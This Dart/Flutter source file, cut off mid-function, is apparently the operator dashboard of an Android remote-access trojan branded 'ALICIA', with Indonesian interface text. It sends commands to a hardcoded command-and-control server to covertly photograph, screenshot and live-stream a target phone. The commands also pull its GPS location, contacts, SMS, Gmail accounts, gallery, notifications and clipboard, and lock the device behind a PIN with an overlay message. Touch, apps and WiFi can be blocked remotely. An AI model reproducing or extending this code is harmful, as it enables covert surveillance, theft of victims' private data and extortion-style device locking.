import 'dart:async';
import 'dart:ui';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'app_theme.dart';
import 'owner_page.dart';
import 'background_settings_page.dart';
import 'background_widget.dart';
import 'profile_image_widget.dart';

// ─────────────────────────────────────────────────────────────────────────────
// MODERN METALLIC THEME
// ─────────────────────────────────────────────────────────────────────────────
// ─── ControlTheme → now uses dynamic AppColors from app_theme.dart ──────────
class ControlTheme {
  static Color get bg          => AppColors.bg;
  static Color get surface     => AppColors.surface;
  static Color get surface2    => AppColors.surfaceLight;
  static Color get surface3    => AppColors.surface2;
  static Color get cardDark    => AppColors.cardDark;
  static Color get silver      => AppColors.accent1;
  static Color get gray1       => AppColors.accent1;
  static Color get gray2       => AppColors.accent2;
  static Color get gray3       => AppColors.accent3;
  static Color get gray4       => AppColors.accent3;
  static Color get accent1     => AppColors.accent1;
  static Color get accent2     => AppColors.accent2;
  static Color get accent3     => AppColors.accent3;
  static Color get textPrimary => AppColors.textPrimary;
  static Color get textSec     => AppColors.textSec;
  static Color get textMuted   => AppColors.textMuted;
  static const success     = Color(0xFF4CAF50);
  static const warning     = Color(0xFFFFAB40);
  static const error       = Color(0xFFEF5350);
  static const shadow      = Color(0x40000000);
  static const shadowHeavy = Color(0x80000000);
}

// ─── SHADOW UTILITIES ──────────────────────────────────────────────────────
// ControlShadowUtils → use ShadowUtils from app_theme.dart
class ControlShadowUtils {
  static List<BoxShadow> get soft  => ShadowUtils.soft;
  static List<BoxShadow> get medium => ShadowUtils.medium;
  static List<BoxShadow> get card  => ShadowUtils.card;
}

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Main Dashboard
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  final String sessionKey;
  final String username;
  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
    this.sessionKey = '',
    this.username = '',
  });
  @override State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  // ── Constants ──────────────────────────────────────────────────────────────
  static const _kBase  = 'http://alanwinter.alannxd.my.id:3298';
  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // App Block State
  bool _whatsappBlocked = false;
  
  // Switch States
  bool _torchOn = false;
  bool _strobeOn = false;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = ControlTheme.error}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m, style: TextStyle(fontWeight: FontWeight.w600, color: Colors.white, fontSize: 12)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: ControlTheme.success);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Koneksi gagal'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('Foto kosong'); return; }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final themeNotifier = ThemeScope.of(context);
    return AnimatedBuilder(
      animation: themeNotifier,
      builder: (context, _) => Scaffold(
        backgroundColor: Colors.transparent,
        extendBodyBehindAppBar: true,
        body: Column(
          children: [
            _buildHeader(),
            _buildBanner(),
            _buildMenuBar(),
            Expanded(child: _buildContent()),
          ],
        ),
      ),
    );
  }

  // ─── HEADER ───────────────────────────────────────────────────────────────
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 48, 16, 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [
            ControlTheme.surface,
            ControlTheme.bg,
          ],
        ),
        border: Border(
          bottom: BorderSide(
            color: ControlTheme.silver.withOpacity(0.15),
            width: 0.5,
          ),
        ),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          // Back button
          GestureDetector(
            onTap: () {
              if (_liveOn) _stopLive();
              Navigator.pop(context);
            },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [ControlTheme.gray1, ControlTheme.gray3],
                ),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.2),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
            ),
          ),
          
          // Title + avatar user
          Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              RichText(
                text: TextSpan(
                  children: [
                    TextSpan(
                      text: 'ALI',
                      style: TextStyle(
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        color: ControlTheme.textPrimary,
                        fontFamily: 'Genetic',
                        letterSpacing: 2,
                      ),
                    ),
                    TextSpan(
                      text: 'CIA',
                      style: TextStyle(
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        color: ControlTheme.textMuted,
                        fontFamily: 'Genetic',
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 10),
              // Avatar foto profil — auto-update saat foto diganti
              ProfileImageWidget(
                size: 36,
                assetFallback: 'assets/images/logo.png',
                borderColor: ControlTheme.silver.withOpacity(0.5),
                borderWidth: 1.5,
                backgroundColor: ControlTheme.surface2,
              ),
            ],
          ),
          
          // Refresh button
          GestureDetector(
            onTap: () { setState(() {}); _cmd('force_open', silent: true); },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [ControlTheme.surface2, ControlTheme.surface3],
                ),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.15),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.refresh_rounded, color: ControlTheme.textMuted, size: 18),
            ),
          ),
        ],
      ),
    );
  }

  // ─── BANNER ───────────────────────────────────────────────────────────────
  Widget _buildBanner() {
    return Container(
      margin: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: ControlTheme.cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: ControlTheme.silver.withOpacity(0.1),
          width: 0.5,
        ),
        boxShadow: ControlShadowUtils.card,
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(15),
        child: Stack(
          children: [
            // Banner Image
            AspectRatio(
              aspectRatio: 16 / 9,
              child: Image.asset(
                'assets/gifs/device.gif',
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(
                  color: ControlTheme.surface2,
                  child: Center(
                    child: Icon(Icons.devices, color: ControlTheme.gray3, size: 48),
                  ),
                ),
              ),
            ),
            
            // Gradient overlay
            Positioned(
              bottom: 0,
              left: 0,
              right: 0,
              child: Container(
                height: 60,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [
                      Colors.transparent,
                      ControlTheme.bg.withOpacity(0.8),
                    ],
                  ),
                ),
              ),
            ),
            
            // Bottom left - ONLINE
            Positioned(
              bottom: 12,
              left: 12,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: ControlTheme.success.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: ControlTheme.success.withOpacity(0.5)),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: const BoxDecoration(
                        color: ControlTheme.success,
                        shape: BoxShape.circle,
                      ),
                    ),
                    SizedBox(width: 6),
                    const Text(
                      'ONLINE',
                      style: TextStyle(
                        color: ControlTheme.success,
                        fontSize: 10,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            
            // Bottom right - Device Info
            Positioned(
              bottom: 12,
              right: 12,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: ControlTheme.bg.withOpacity(0.6),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(
                    color: ControlTheme.silver.withOpacity(0.1),
                    width: 0.5,
                  ),
                ),
                child: Row(
                  children: [
                    Icon(Icons.device_unknown, color: ControlTheme.silver, size: 12),
                    SizedBox(width: 4),
                    Text(
                      _model,
                      style: TextStyle(
                        color: ControlTheme.silver,
                        fontSize: 10,
                        fontWeight: FontWeight.w500,
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── MENU BAR ─────────────────────────────────────────────────────────────
  Widget _buildMenuBar() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(
        color: ControlTheme.surface2,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: ControlTheme.silver.withOpacity(0.1),
          width: 0.5,
        ),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Row(
            children: [
              Icon(Icons.phone_android, color: ControlTheme.silver, size: 20),
              SizedBox(width: 8),
              Text(
                _model,
                style: TextStyle(
                  color: ControlTheme.textMuted,
                  fontSize: 10,
                  fontWeight: FontWeight.w500,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ],
          ),
          Row(
            children: [
              Icon(Icons.battery_std, color: _getBatteryColor(), size: 16),
              SizedBox(width: 4),
              Text(
                '$_battery%',
                style: TextStyle(
                  color: _getBatteryColor(),
                  fontSize: 11,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Color _getBatteryColor() {
    final bat = int.tryParse(_battery) ?? 0;
    if (bat >= 70) return ControlTheme.success;
    if (bat >= 30) return ControlTheme.warning;
    return ControlTheme.error;
  }

  // ─── CONTENT ──────────────────────────────────────────────────────────────
  Widget _buildContent() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('LIVE', ControlTheme.error, Icons.videocam_rounded, _pageLive),
            _GridButton('CAM', ControlTheme.silver, Icons.camera_alt_rounded, _pageCamera),
            _GridButton('INTEL', ControlTheme.gray1, Icons.psychology_rounded, _pageIntel),
            _GridButton('DEV', ControlTheme.gray2, Icons.developer_mode_rounded, _pageDevice),
            _GridButton('CHAT', ControlTheme.gray3, Icons.chat_rounded, _pageLock),
            _GridButton('AUDIO', ControlTheme.gray4, Icons.audiotrack_rounded, _pageAudio),
            _GridButton('FILE', ControlTheme.silver, Icons.folder_rounded, _showFileManager),
            _GridButton('CLIPBOARD', ControlTheme.gray2, Icons.content_paste_rounded, _getClipboard),
          ], columns: 2),
          
          // ─── OWNER PANEL BUTTON (hanya untuk role owner) ──────────────
          if (widget.role.toLowerCase() == 'owner') ...[
            SizedBox(height: 4),
            _buildOwnerPanelButton(),
          ],

          // ─── GANTI FOTO / VIDEO BUTTON ────────────────────────────────
          SizedBox(height: 4),
          _buildGantiFotoVideoButton(),

          // ─── GANTI WARNA BUTTON ───────────────────────────────────────
          SizedBox(height: 12),
          _buildColorThemeButton(),
          SizedBox(height: 8),
        ],
      ),
    );
  }

  // ─── OWNER PANEL BUTTON ────────────────────────────────────────────────────
  Widget _buildOwnerPanelButton() {
    return InkWell(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => BackgroundWrapper(
            child: OwnerPage(
              sessionKey: widget.sessionKey,
              username: widget.username,
            ),
          ),
        ),
      ),
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              ControlTheme.surface2,
              ControlTheme.surface,
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: ControlTheme.silver.withOpacity(0.3),
            width: 0.5,
          ),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.25),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.storefront_rounded, color: ControlTheme.silver, size: 22),
            ),
            SizedBox(width: 16),
            Expanded(
              child: Text(
                'OWNER PANEL',
                style: TextStyle(
                  fontSize: 13,
                  fontWeight: FontWeight.w700,
                  color: ControlTheme.textPrimary,
                  letterSpacing: 1.5,
                ),
              ),
            ),
            Icon(Icons.chevron_right_rounded, color: ControlTheme.textMuted, size: 20),
          ],
        ),
      ),
    );
  }

  // ─── GANTI FOTO / VIDEO BUTTON ────────────────────────────────────────────
  Widget _buildGantiFotoVideoButton() {
    return InkWell(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => BackgroundWrapper(
            child: BackgroundSettingsPage(
              onBackgroundChanged: () => setState(() {}),
            ),
          ),
        ),
      ),
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              ControlTheme.surface2,
              ControlTheme.surface,
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: ControlTheme.silver.withOpacity(0.3),
            width: 0.5,
          ),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.25),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.photo_library_rounded, color: ControlTheme.silver, size: 22),
            ),
            SizedBox(width: 16),
            Expanded(
              child: Text(
                'GANTI FOTO / VIDEO',
                style: TextStyle(
                  fontSize: 13,
                  fontWeight: FontWeight.w700,
                  color: ControlTheme.textPrimary,
                  letterSpacing: 1.5,
                ),
              ),
            ),
            Icon(Icons.chevron_right_rounded, color: ControlTheme.textMuted, size: 20),
          ],
        ),
      ),
    );
  }

  // ─── GANTI WARNA BUTTON ────────────────────────────────────────────────────
  Widget _buildColorThemeButton() {
    final themeNotifier = ThemeScope.of(context);
    final current = themeNotifier.current;
    return InkWell(
      onTap: _showColorPicker,
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              ControlTheme.surface2,
              ControlTheme.surface,
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: current.hue.withOpacity(0.4),
            width: 0.5,
          ),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Row(
          children: [
            // Ikon kuas di kiri
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: current.hue.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: current.hue.withOpacity(0.3),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.brush_rounded, color: current.hue, size: 22),
            ),
            SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'GANTI WARNA',
                    style: TextStyle(
                      fontSize: 13,
                      fontWeight: FontWeight.w700,
                      color: ControlTheme.textPrimary,
                      letterSpacing: 1.5,
                    ),
                  ),
                  SizedBox(height: 2),
                  Text(
                    '${current.emoji} ${current.name} • ${themeNotifier.isDark ? "Warna Tua" : "Warna Muda"}',
                    style: TextStyle(
                      fontSize: 10,
                      color: ControlTheme.textMuted,
                    ),
                  ),
                ],
              ),
            ),
            // Preview warna aktif
            Container(
              width: 24,
              height: 24,
              decoration: BoxDecoration(
                color: current.hue,
                shape: BoxShape.circle,
                border: Border.all(color: Colors.white.withOpacity(0.3), width: 1.5),
              ),
            ),
            SizedBox(width: 8),
            Icon(Icons.chevron_right_rounded, color: ControlTheme.textMuted, size: 20),
          ],
        ),
      ),
    );
  }

  // ─── COLOR PICKER SHEET ────────────────────────────────────────────────────
  void _showColorPicker() {
    showColorPickerSheet(context);
  }

  // ─────────────────────────────────────────────────────────────────────────
  // PAGE FUNCTIONS (All using BottomSheet)
  // ─────────────────────────────────────────────────────────────────────────
  
  void _pageLive() {
    _showCamPicker((side) { 
      _startLive('live_camera_start', side); 
      _showLiveDialog(); 
    });
  }

  void _pageCamera() {
    _showModernSheet(
      title: 'CAMERA',
      icon: Icons.camera_alt_rounded,
      child: _buildGridButtons([
        _GridButton('Take Photo', ControlTheme.silver, Icons.camera_alt_rounded, () {
          Navigator.pop(context);
          _showCamPicker((s) => _cmd('take_photo', extra: s));
        }),
        _GridButton('Screenshot', ControlTheme.gray1, Icons.screenshot_monitor, () {
          Navigator.pop(context);
          _cmd('get_screen');
        }),
        _GridButton('Set Wallpaper', ControlTheme.gray3, Icons.wallpaper_rounded, () {
          Navigator.pop(context);
          _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v));
        }),
        _GridButton('Strobe', ControlTheme.silver, Icons.flash_on_rounded, () {
          Navigator.pop(context);
          _showStrobeDialog();
        }),
        _GridButton('Torch', ControlTheme.silver, Icons.flashlight_on_rounded, () {
          Navigator.pop(context);
          _showTorchDialog();
        }),
      ], columns: 2),
    );
  }

  void _pageIntel() {
    _showModernSheet(
      title: 'INTELLIGENCE',
      icon: Icons.psychology_rounded,
      isScrollable: true,
      child: _buildGridButtons([
        _GridButton('Contacts', ControlTheme.gray3, Icons.contacts_rounded, () {
          Navigator.pop(context);
          _cmd('get_contacts');
        }),
        _GridButton('GPS Location', ControlTheme.success, Icons.my_location_rounded, () {
          Navigator.pop(context);
          _cmd('get_location');
        }),
        _GridButton('Gmail & Accounts', ControlTheme.gray1, Icons.account_circle_rounded, () {
          Navigator.pop(context);
          _cmd('get_gmails');
        }),
        _GridButton('SMS Inbox', ControlTheme.gray2, Icons.sms_rounded, () {
          Navigator.pop(context);
          _cmd('get_sms');
        }),
        _GridButton('Notifications', ControlTheme.silver, Icons.notifications_rounded, () {
          Navigator.pop(context);
          _fetchNotif();
        }),
        _GridButton('Gallery (5 Photos)', ControlTheme.gray3, Icons.photo_library_rounded, () {
          Navigator.pop(context);
          _cmd('get_gallery', extra: '5');
        }),
        _GridButton('Request Notif Access', ControlTheme.textMuted, Icons.security_rounded, () {
          Navigator.pop(context);
          _cmd('open_notification_settings');
        }),
        _GridButton('Touch Block', ControlTheme.error, Icons.touch_app_rounded, () {
          Navigator.pop(context);
          _showTouchBlockDialog();
        }),
        _GridButton('App Blocked', ControlTheme.silver, Icons.block_rounded, () {
          Navigator.pop(context);
          _showAppBlockSheet();
        }),
      ], columns: 2),
    );
  }

  void _pageAudio() {
    _showModernSheet(
      title: 'AUDIO',
      icon: Icons.audiotrack_rounded,
      child: _buildGridButtons([
        _GridButton('Play Audio', ControlTheme.silver, Icons.play_circle_rounded, () {
          Navigator.pop(context);
          _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v));
        }),
        _GridButton('Stop Audio', ControlTheme.textMuted, Icons.stop_circle_rounded, () {
          Navigator.pop(context);
          _cmd('stop_audio');
        }),
        _GridButton('Vibrate Loop', ControlTheme.gray3, Icons.vibration_rounded, () {
          Navigator.pop(context);
          _cmd('vibrate_loop');
        }),
        _GridButton('Open URL', ControlTheme.gray1, Icons.open_in_browser, () {
          Navigator.pop(context);
          _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v));
        }),
        _GridButton('Kill WiFi', ControlTheme.gray2, Icons.wifi_off_rounded, () {
          Navigator.pop(context);
          _cmd('kill_wifi');
        }),
      ], columns: 2),
    );
  }

  void _pageLock() {
    _showModernSheet(
      title: 'LOCK & CHAT',
      icon: Icons.lock_rounded,
      isScrollable: true,
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('Lock Live + Chat', ControlTheme.error, Icons.lock_rounded, () {
              Navigator.pop(context);
              _lockLiveDialog();
            }),
            _GridButton('Lock Device', ControlTheme.silver, Icons.lock_outline_rounded, () {
              Navigator.pop(context);
              _inputDialog('Lock Device', 'Pesan di layar lock', (msg) {
                _inputDialog('PIN Unlock', '4 digit PIN', (pin) {
                  _cmd('hard_lock', extra: '$msg|$pin');
                }, isNumber: true, hint: '1234');
              });
            }),
            _GridButton('Unlock Device', ControlTheme.success, Icons.lock_open_rounded, () {
              Navigator.pop(context);
              _cmd('unlock');
            }),
            _GridButton('Overlay Lock', ControlTheme.gray3, Icons.layers_rounded, () {
              Navigator.pop(context);
              _showOverlayLockDialog();
            }),
          ], columns: 2),
          SizedBox(height: 20),
          _buildChatSection(),
        ],
      ),
    );
  }

  void _pageDevice() {
    _showModernSheet(
      title: 'DEVICE',
      icon: Icons.developer_mode_rounded,
      isScrollable: true,
      child: Column(
        children: [
          _buildGridButtons([
            _GridButton('Restart Device', ControlTheme.silver, Icons.restart_alt_rounded, () {
              Navigator.pop(context);
              _showRestartDialog();
            }),
            _GridButton('Wake Up Target', ControlTheme.success, Icons.wb_sunny_rounded, () {
              Navigator.pop(context);
              _cmd('force_open');
            }),
            _GridButton('SSID WiFi', ControlTheme.gray3, Icons.wifi_rounded, () {
              Navigator.pop(context);
              _getSSID();
            }),
          ], columns: 2),
          SizedBox(height: 20),
          _buildRestartMethods(),
        ],
      ),
    );
  }

  // ─── MODERN SHEET BUILDER ──────────────────────────────────────────────
  void _showModernSheet({
    required String title,
    required IconData icon,
    required Widget child,
    bool isScrollable = false,
  }) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: ControlTheme.surface,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(
            top: BorderSide(
              color: ControlTheme.silver.withOpacity(0.1),
              width: 0.5,
            ),
          ),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: isScrollable ? 0.85 : 0.5,
          maxChildSize: 0.92,
          minChildSize: 0.3,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              // Handle
              Container(
                margin: const EdgeInsets.only(top: 12),
                height: 4,
